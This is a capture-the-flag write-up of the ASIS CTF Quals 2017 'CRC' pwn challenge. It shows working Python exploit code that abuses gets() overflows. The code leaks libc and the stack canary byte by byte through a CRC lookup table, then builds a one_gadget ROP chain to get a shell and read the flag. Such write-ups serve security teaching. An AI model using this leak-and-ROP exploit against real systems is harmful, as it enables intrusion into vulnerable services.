# ASIS CTF Quals 2017 - pwn - CRC - 123 pts

> Description:
>
>    We have setup a fresh CRC generator service, but it's not hardened, so find the flag.
>    This service running on latest Ubuntu Xenial OS.

>    nc 69.90.132.40 4002
    
> Attachment: [crcme](crcme) [crchelper.c](crchelper.c) [xpl.py](xpl.py) [libc_32.so.6](libc_32.so.6)
>

# Write-up

The CRC service asks us for a size and some data to process. It then generates a checksum for the specified string and prints it back. 

Quick check with checksec reveals:

```
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
```

Well, at least no PIE, but it's ovious, we'll have to leak some data to get around those restrictions. 

The function *get_userinput_number* contained an obvious buffer overflow, but it's guarded with a canary, so it won't be that easy to exploit.

```
int get_userinput_number() 
{
	gets(s);
	return atoi(s);
}
``` 

OK, we'll need some way to leak memory addresses in order to find LIBC and to read the canary. After that, it should be an easy task to use *get_userinput_number* to execute a rop chain.

Took an educated guess there, that the crc functionality should be abused to leak some data ;-)

And yep, another "buffer overflow" happened to arise when reading the data, that should be CRC'ed.


```
char s; 			// [sp+4h] [bp-84h]@1
char *ptrInput; 	// [sp+68h] [bp-20h]@1
[SNIP]
ptrInput = &s;
[SNIP]
gets(&s);
calcCrc(ptrInput, crcSize);
```

So, if everything goes right, ptrInput is pointing to the string, the user entered and gets used as the argument for the CRC function. But since it's directly behind the input string (s) itself and *gets* is used, we can overwrite the pointer with some arbitrary address. With this we're able to create a checksum for the data that's stored at any address. A step forward, but still, we will only get the CRC value for the data at this address. Thus, we need a method to reverse it in order to get the original value that's stored there.

To make this easier, we can pass a size of 1, so the CRC function will only calculate the checksum for one byte. We'll still need a way to reverse this but since we're now only considering one byte, there will be only 256 possible checksum values. This should be easy to brute force.

Ripped the CRC initialization method and the calculation method directly from the binary and created a short c script with it (see *crchelper.c*), which will generate a lookup table with the checksums for every possible byte.

Now we just have to call the CRC function for every byte in the address, we want to read and extract the returned checksum. The index of the checksum in our lookup table then represents the byte stored at the specified address. 

```python
CRCLOOKUP = [0xd202ef8d,0xa505df1b,0x3c0c8ea1,0x4b0bbe37,0xd56f2b94,0xa2681b02,0x3b614ab8,0x4c667a2e,0xdcd967bf,0xabde5729,0x32d70693,0x45d03605,0xdbb4a3a6,0xacb39330,0x35bac28a,0x42bdf21c,0xcfb5ffe9,0xb8b2cf7f,0x21bb9ec5,0x56bcae53,0xc8d83bf0,0xbfdf0b66,0x26d65adc,0x51d16a4a,0xc16e77db,0xb669474d,0x2f6016f7,0x58672661,0xc603b3c2,0xb1048354,0x280dd2ee,0x5f0ae278,0xe96ccf45,0x9e6bffd3,0x762ae69,0x70659eff,0xee010b5c,0x99063bca,0xf6a70,0x77085ae6,0xe7b74777,0x90b077e1,0x9b9265b,0x7ebe16cd,0xe0da836e,0x97ddb3f8,0xed4e242,0x79d3d2d4,0xf4dbdf21,0x83dcefb7,0x1ad5be0d,0x6dd28e9b,0xf3b61b38,0x84b12bae,0x1db87a14,0x6abf4a82,0xfa005713,0x8d076785,0x140e363f,0x630906a9,0xfd6d930a,0x8a6aa39c,0x1363f226,0x6464c2b0,0xa4deae1d,0xd3d99e8b,0x4ad0cf31,0x3dd7ffa7,0xa3b36a04,0xd4b45a92,0x4dbd0b28,0x3aba3bbe,0xaa05262f,0xdd0216b9,0x440b4703,0x330c7795,0xad68e236,0xda6fd2a0,0x4366831a,0x3461b38c,0xb969be79,0xce6e8eef,0x5767df55,0x2060efc3,0xbe047a60,0xc9034af6,0x500a1b4c,0x270d2bda,0xb7b2364b,0xc0b506dd,0x59bc5767,0x2ebb67f1,0xb0dff252,0xc7d8c2c4,0x5ed1937e,0x29d6a3e8,0x9fb08ed5,0xe8b7be43,0x71beeff9,0x6b9df6f,0x98dd4acc,0xefda7a5a,0x76d32be0,0x1d41b76,0x916b06e7,0xe66c3671,0x7f6567cb,0x862575d,0x9606c2fe,0xe101f268,0x7808a3d2,0xf0f9344,0x82079eb1,0xf500ae27,0x6c09ff9d,0x1b0ecf0b,0x856a5aa8,0xf26d6a3e,0x6b643b84,0x1c630b12,0x8cdc1683,0xfbdb2615,0x62d277af,0x15d54739,0x8bb1d29a,0xfcb6e20c,0x65bfb3b6,0x12b88320,0x3fba6cad,0x48bd5c3b,0xd1b40d81,0xa6b33d17,0x38d7a8b4,0x4fd09822,0xd6d9c998,0xa1def90e,0x3161e49f,0x4666d409,0xdf6f85b3,0xa868b525,0x360c2086,0x410b1010,0xd80241aa,0xaf05713c,0x220d7cc9,0x550a4c5f,0xcc031de5,0xbb042d73,0x2560b8d0,0x52678846,0xcb6ed9fc,0xbc69e96a,0x2cd6f4fb,0x5bd1c46d,0xc2d895d7,0xb5dfa541,0x2bbb30e2,0x5cbc0074,0xc5b551ce,0xb2b26158,0x4d44c65,0x73d37cf3,0xeada2d49,0x9ddd1ddf,0x3b9887c,0x74beb8ea,0xedb7e950,0x9ab0d9c6,0xa0fc457,0x7d08f4c1,0xe401a57b,0x930695ed,0xd62004e,0x7a6530d8,0xe36c6162,0x946b51f4,0x19635c01,0x6e646c97,0xf76d3d2d,0x806a0dbb,0x1e0e9818,0x6909a88e,0xf000f934,0x8707c9a2,0x17b8d433,0x60bfe4a5,0xf9b6b51f,0x8eb18589,0x10d5102a,0x67d220bc,0xfedb7106,0x89dc4190,0x49662d3d,0x3e611dab,0xa7684c11,0xd06f7c87,0x4e0be924,0x390cd9b2,0xa0058808,0xd702b89e,0x47bda50f,0x30ba9599,0xa9b3c423,0xdeb4f4b5,0x40d06116,0x37d75180,0xaede003a,0xd9d930ac,0x54d13d59,0x23d60dcf,0xbadf5c75,0xcdd86ce3,0x53bcf940,0x24bbc9d6,0xbdb2986c,0xcab5a8fa,0x5a0ab56b,0x2d0d85fd,0xb404d447,0xc303e4d1,0x5d677172,0x2a6041e4,0xb369105e,0xc46e20c8,0x72080df5,0x50f3d63,0x9c066cd9,0xeb015c4f,0x7565c9ec,0x262f97a,0x9b6ba8c0,0xec6c9856,0x7cd385c7,0xbd4b551,0x92dde4eb,0xe5dad47d,0x7bbe41de,0xcb97148,0x95b020f2,0xe2b71064,0x6fbf1d91,0x18b82d07,0x81b17cbd,0xf6b64c2b,0x68d2d988,0x1fd5e91e,0x86dcb8a4,0xf1db8832,0x616495a3,0x1663a535,0x8f6af48f,0xf86dc419,0x660951ba,0x110e612c,0x88073096,0xff000000]

def crc(size, payload):
	r.sendline("1")
	r.recvuntil("What is the length of your data:")
	r.sendline(str(size))
	r.recvuntil("process:")
	r.sendline(payload)

	r.recvuntil("CRC is: ")
	data = r.recvline()

	r.recvuntil("Choice:")	

	return data

def readAddress(address):
	result = 0

	for i in range(0, 4):
		payload = "A"*100
		payload += p32(address+i)

		crcByte = int(crc(1, payload), 16)
		orgByte = CRCLOOKUP.index(crcByte)

		result += orgByte << (i*8)
		
	return result
```

Armed with this, we can read some got entry and calculate the libc base address with it. With libc at hand, we'll have for one access to more rop gadgets, than we'll ever need and we can also leak *__environ* with it. Since it will be stored at a fixed offset to the canary, we can then calculate the position of the canary on the stack.

Having the address of the canary, we can just "de-crc" it the same way, and it should soon be game over for the service.

```python
EXITGOT = 0x08049fec

def exploit(r):
	r.recvuntil("Choice:")

	EXIT = readAddress(EXITGOT)	
	LIBC = EXIT - 0x2e7b0

	print ("[+] EXIT       : %s" % hex(EXIT))
	print ("[+] LIBC       : %s" % hex(LIBC))

	__ENV = LIBC + 0x001b1dbc

	ENVPTR = readAddress(__ENV)
	CANARYPTR = ENVPTR - 0xd0

	print ("[+] ENV        : %s" % hex(ENVPTR))
	print ("[+] Canary ptr : %s" % hex(CANARYPTR))

	CANARY = readAddress(CANARYPTR)

	print ("[+] Canary     : %s" % hex(CANARY))
```

```
python xpl.py 
[+] Opening connection to localhost on port 6666: Done
[7087]
[*] Paused (press any to continue)
[+] EXIT       : 0xf7e4c7b0
[+] LIBC       : 0xf7e1e000
[+] ENV        : 0xffffd32c
[+] Canary ptr : 0xffffd25c
[+] Canary     : 0xfe381000
```

Almost there... The buffer overflow in "get_userinput_function" should now be an easy victim. 

Used one_gadget to find a magic gadget in their libc to make things even easier.

```
$ one_gadget libc_32.so.6
0x3a819	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the address of `rw-p` area of libc
  [esp+0x34] == NULL

0x5f065	execl("/bin/sh", eax)
constraints:
  esi is the address of `rw-p` area of libc
  eax == NULL

0x5f066	execl("/bin/sh", [esp])
constraints:
  esi is the address of `rw-p` area of libc
  [esp] == NULL
```

With this our final ropchain is:

```python
	ONEGADGET = LIBC + 0x5f065
	RWP = LIBC + 0x1b0000
	POP_ESI_EDI_EBP = 0x08048850
	XOREAX = LIBC + 0x0002c5fc
	
	payload = "C"*40
	payload += p32(CANARY)
	payload += "B"*12
	payload += p32(POP_ESI_EDI_EBP)
	payload += p32(RWP)
	payload += p32(0xdeadbeef)
	payload += p32(0xdeadbeef)
	payload += p32(XOREAX)
	payload += p32(ONEGADGET)

	r.sendline(payload)
	
	r.interactive()

	return
```

```c
$ python xpl.py 1
[+] Opening connection to 69.90.132.40 on port 4002: Done
[+] EXIT       : 0xf75dc7b0
[+] LIBC       : 0xf75ae000
[+] ENV        : 0xffd1cd3c
[+] Canary ptr : 0xffd1cc6c
[+] Canary     : 0xffa0db00
[+] ONEGADGET  : 0xf760d065
[*] Switching to interactive mode
 $ whoami
task2
$ cat /home/task2/flag.txt
**ASIS{db17755326b5df9dab92e18e43c3ee51}
```



